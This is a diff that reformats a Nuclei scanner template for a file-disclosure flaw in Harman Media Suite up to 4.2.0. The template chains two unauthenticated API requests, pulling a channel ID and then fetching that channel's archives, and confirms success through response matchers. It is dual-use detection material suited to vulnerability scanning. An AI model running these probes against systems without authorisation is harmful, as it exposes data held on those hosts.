@@ -1,5 +1,4 @@
 id: harman-media-suite-lfi
-
 info:
   name: Harman Media Suite <= 4.2.0 - Local File Disclosure
   author: s4e-io
@@ -15,21 +14,18 @@ info:
     - https://sploitus.com/exploit?id=C20FE0B5-806A-5687-850C-75D195576B35
     - https://mediasuite.harman.com/channel-store
   metadata:
-    verified: true
-    max-request: 2
-    vendor: harman
-    product: media-suite
     fofa-query: "Harman Media Suite"
-  tags: harman,media-suite,lfi,vuln
-
+    max-request: 2
+    product: media-suite
+    vendor: harman
+    verified: true
+  tags: harman,lfi,media-suite,vuln
 flow: http(1) && http(2)
-
 http:
   - raw:
       - |
         GET /userportal/api/rest/contentChannels/?startIndex=0&pageSize=4&sort=TIME&showType=all HTTP/1.1
         Host: {{Hostname}}
-
     matchers:
       - type: dsl
         dsl:
@@ -38,7 +34,6 @@ http:
           - 'status_code == 200'
         condition: and
         internal: true
-
     extractors:
       - type: regex
         name: channelId
@@ -46,12 +41,10 @@ http:
         regex:
           - '"channelId":"([^"]+)"'
         internal: true
-
   - raw:
       - |
         GET /userportal/api/rest/contentChannels/{{channelId}}/archives/?startIndex=0&pageSize=15&sort=time&onlyIncludeApproved=true HTTP/1.1
         Host: {{Hostname}}
-
     matchers:
       - type: dsl
         dsl:
@@ -59,4 +52,4 @@ http:
           - 'contains(content_type, "application/vnd.plcm.plcm-csc+json")'
           - 'status_code == 200'
         condition: and
-# digest: 490a004630440220012f4627b1921d4e49361f95f0eb834154e3c7d375282ef54e6a943ec98356ff02206a81f3858bddd2da06c996f6095b810459eeac35c203c4cbe4093f7ecec8dc6e:922c64590222798bb761d5b6d8e72950
+        # digest: 490a004630440220012f4627b1921d4e49361f95f0eb834154e3c7d375282ef54e6a943ec98356ff02206a81f3858bddd2da06c996f6095b810459eeac35c203c4cbe4093f7ecec8dc6e:922c64590222798bb761d5b6d8e72950
